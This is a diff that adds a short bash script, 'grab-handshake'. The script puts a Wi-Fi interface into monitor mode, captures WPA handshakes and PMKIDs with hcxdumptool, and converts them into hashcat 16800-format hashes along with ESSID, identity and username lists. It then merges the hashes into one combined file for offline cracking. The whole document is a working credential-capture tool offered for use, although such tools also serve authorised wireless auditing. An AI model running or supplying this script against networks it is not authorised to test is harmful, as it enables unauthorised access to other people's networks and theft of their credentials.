@@ -1,0 +1,33 @@
+#!/bin/bash
+# grab-handshake
+
+if [ $USER != "root" ]; then
+    echo "This script must be run as root."
+    exit
+fi
+file_path=~/handshakes
+mkdir -p ${file_path}
+
+interface_target=$(ip a | grep wlan | grep -v mon | awk '{ print $2 }' | head -n 1 | sed -r 's/://g')
+
+file_name=$(date +"%m%d%M%S")
+airmon-ng start "${interface_target}"
+
+hcxdumptool -i "${interface_target}mon" -o ${file_path}/${file_name}.pcapng --enable status=1
+airmon-ng stop "${interface_target}mon"
+
+hcxpcaptool -E essidlist -I identitylist -U usernamelist -z ${file_path}/${file_name}.16800 ${file_path}/${file_name}.pcapng
+
+
+cat ${file_path}/${file_name}.16800
+
+cd ${file_path}
+ls -1 | grep '.16800' | while read -r line; do
+    cat "$line" >> .combined.16800.tmp
+done
+
+cat .combined.16800.tmp | sort -u | tee combined.16800
+
+rm .combined.16800.tmp
+rm ${file_path}/${file_name}.pcapng
+
